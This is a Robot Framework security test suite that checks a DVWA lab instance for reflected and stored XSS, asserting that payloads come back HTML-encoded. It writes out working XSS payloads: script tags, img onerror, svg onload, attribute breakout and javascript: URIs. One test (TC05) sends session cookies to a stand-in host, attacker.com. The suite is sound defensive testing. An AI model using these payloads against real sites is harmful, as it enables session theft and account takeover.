*** Settings ***
Documentation     XSS (Cross-Site Scripting) security tests targeting DVWA.
...
...               Covers: Reflected XSS, Stored XSS, event handler injection,
...               attribute breakout, and SVG-based payloads.
...
...               A secure app MUST HTML-encode output:
...               < → &lt;    > → &gt;    " → &quot;    ' → &#x27;
...
...               Setup: docker-compose up -d  (see project README)

Library           RequestsLibrary
Library           Collections
Library           String
Resource          ../../Resources/CommonKeywords.robot
Resource          ../../Resources/Variables.robot

Suite Setup       Run Keywords
...               Create Session For DVWA    AND
...               ${COOKIES}=    Get Authenticated Session    AND
...               Set Suite Variable    ${COOKIES}

*** Test Cases ***

# ------------------------------------------------------------------ #
#  REFLECTED XSS                                                       #
# ------------------------------------------------------------------ #

XSS_TC01 - Reflected Script Tag Is Sanitized
    [Documentation]    Most basic XSS payload: <script>alert(1)</script>
    ...                Vulnerable app reflects this directly in HTML — browser executes it.
    ...                Secure app HTML-encodes: &lt;script&gt;alert(1)&lt;/script&gt;
    [Tags]    xss    reflected    high_priority
    ${resp}=    GET Request With Cookies
    ...    path=${XSS_REFLECTED_PATH}    cookies=${COOKIES}
    ...    params=name=<script>alert(1)</script>&Submit=Submit
    Should Not Contain    ${resp.text}    <script>alert(1)</script>
    ...    msg=Raw script tag in response — Reflected XSS confirmed!
    Log    Script tag XSS sanitized correctly.

XSS_TC02 - Reflected Img onerror Event Handler Is Sanitized
    [Documentation]    Uses an <img> with an onerror event — bypasses script tag filters.
    ...                Payload: <img src=x onerror=alert(1)>
    [Tags]    xss    reflected    event_handler
    ${resp}=    GET Request With Cookies
    ...    path=${XSS_REFLECTED_PATH}    cookies=${COOKIES}
    ...    params=name=<img src=x onerror=alert(1)>&Submit=Submit
    Should Not Contain    ${resp.text}    onerror=alert
    ...    msg=onerror event handler reflected — XSS via img tag confirmed!

XSS_TC03 - Reflected SVG onload Is Sanitized
    [Documentation]    SVG onload is often missed by filters that only check <script>.
    ...                Payload: <svg onload=alert(1)>
    [Tags]    xss    reflected    svg
    ${resp}=    GET Request With Cookies
    ...    path=${XSS_REFLECTED_PATH}    cookies=${COOKIES}
    ...    params=name=<svg onload=alert(1)>&Submit=Submit
    Should Not Contain    ${resp.text}    <svg onload=
    ...    msg=SVG onload reflected — XSS via SVG tag confirmed!

XSS_TC04 - Attribute Breakout XSS Is Sanitized
    [Documentation]    Breaks out of an HTML attribute value to inject a script tag.
    ...                Payload: "><script>alert(1)</script>
    ...                If input is inside: <input value="USER_INPUT">
    ...                It becomes: <input value=""><script>alert(1)</script>">
    [Tags]    xss    reflected    attribute_breakout
    ${resp}=    GET Request With Cookies
    ...    path=${XSS_REFLECTED_PATH}    cookies=${COOKIES}
    ...    params=name="><script>alert(1)</script>&Submit=Submit
    Should Not Contain    ${resp.text}    "><script>
    ...    msg=Attribute breakout XSS reflected — vulnerability confirmed!

XSS_TC05 - Cookie Stealing Payload Is Sanitized
    [Documentation]    Real-world XSS payload: redirects to attacker server with session cookie.
    ...                Payload: <script>document.location='http://attacker.com?c='+document.cookie</script>
    [Tags]    xss    reflected    cookie_theft    critical
    ${payload}=    Set Variable    <script>document.location='http://attacker.com?c='+document.cookie</script>
    ${resp}=    GET Request With Cookies
    ...    path=${XSS_REFLECTED_PATH}    cookies=${COOKIES}
    ...    params=name=${payload}&Submit=Submit
    Should Not Contain    ${resp.text}    document.cookie
    ...    msg=Cookie theft payload reflected — high severity XSS!

XSS_TC06 - HTML Entity Encoding Verified in Response
    [Documentation]    Positive test: confirms the app is properly encoding output.
    ...                If < is encoded to &lt; the app is safe.
    [Tags]    xss    positive    encoding_check
    ${resp}=    GET Request With Cookies
    ...    path=${XSS_REFLECTED_PATH}    cookies=${COOKIES}
    ...    params=name=<test>&Submit=Submit
    # Either the tag should not appear at all, or it should be encoded
    ${has_raw_tag}=    Run Keyword And Return Status    Should Contain    ${resp.text}    <test>
    IF    ${has_raw_tag}
        Fail    Raw unencoded <test> tag found — output is not being HTML-encoded!
    END
    Log    Output correctly encoded — <test> not reflected as raw HTML.

# ------------------------------------------------------------------ #
#  STORED XSS                                                          #
# ------------------------------------------------------------------ #

XSS_TC07 - Stored XSS Script Tag In Comment Field Is Sanitized
    [Documentation]    Posts a script payload to the stored XSS endpoint.
    ...                A vulnerable app saves it to DB and serves it raw to all viewers.
    ...                A secure app HTML-encodes before storing or before rendering.
    [Tags]    xss    stored    high_priority
    ${data}=    Create Dictionary
    ...    txtName=TestUser
    ...    mtxMessage=<script>alert('StoredXSS')</script>
    ...    btnSign=Sign+Guestbook
    ${post_resp}=    POST Request With Cookies    path=${XSS_STORED_PATH}    data=${data}    cookies=${COOKIES}

    # Now GET the page and verify the payload is not reflected raw
    ${get_resp}=    GET Request With Cookies    path=${XSS_STORED_PATH}    cookies=${COOKIES}
    Should Not Contain    ${get_resp.text}    <script>alert('StoredXSS')</script>
    ...    msg=Stored XSS: script payload rendered raw in response!

XSS_TC08 - Stored XSS Img onerror In Name Field Is Sanitized
    [Documentation]    Tests the name field — a shorter payload to confirm it's not just the message field.
    [Tags]    xss    stored
    ${data}=    Create Dictionary
    ...    txtName=<img src=x onerror=alert(1)>
    ...    mtxMessage=normal message
    ...    btnSign=Sign+Guestbook
    ${post_resp}=    POST Request With Cookies    path=${XSS_STORED_PATH}    data=${data}    cookies=${COOKIES}
    ${get_resp}=    GET Request With Cookies    path=${XSS_STORED_PATH}    cookies=${COOKIES}
    Should Not Contain    ${get_resp.text}    onerror=alert
    ...    msg=Stored XSS via name field — img onerror rendered raw!

XSS_TC09 - Stored XSS Very Long Payload Is Handled Safely
    [Documentation]    Some apps only sanitize up to a length limit.
    ...                Tests a 1000-char payload to check edge cases.
    [Tags]    xss    stored    boundary
    ${long_payload}=    Evaluate    '<script>' + 'A' * 990 + '</script>'
    ${data}=    Create Dictionary
    ...    txtName=LongPayloadTest
    ...    mtxMessage=${long_payload}
    ...    btnSign=Sign+Guestbook
    ${post_resp}=    POST Request With Cookies    path=${XSS_STORED_PATH}    data=${data}    cookies=${COOKIES}
    ${get_resp}=    GET Request With Cookies    path=${XSS_STORED_PATH}    cookies=${COOKIES}
    Response Should Not Contain Script Tags    ${get_resp}

# ------------------------------------------------------------------ #
#  ENCODING BYPASS ATTEMPTS                                            #
# ------------------------------------------------------------------ #

XSS_TC10 - URL Encoded XSS Payload Is Sanitized
    [Documentation]    URL-encoding the payload: %3Cscript%3Ealert(1)%3C/script%3E
    ...                Some WAFs only check decoded content — this tests double-decode issues.
    [Tags]    xss    encoding_bypass
    ${resp}=    GET Request With Cookies
    ...    path=${XSS_REFLECTED_PATH}    cookies=${COOKIES}
    ...    params=name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&Submit=Submit
    Should Not Contain    ${resp.text}    <script>alert(1)</script>

XSS_TC11 - Javascript Protocol In Input Is Sanitized
    [Documentation]    javascript: protocol can execute code in anchor hrefs or event handlers.
    ...                Payload: javascript:alert(1)
    [Tags]    xss    protocol_injection
    ${resp}=    GET Request With Cookies
    ...    path=${XSS_REFLECTED_PATH}    cookies=${COOKIES}
    ...    params=name=javascript:alert(1)&Submit=Submit
    Should Not Contain    ${resp.text}    javascript:alert
    ...    msg=javascript: protocol payload reflected in response!
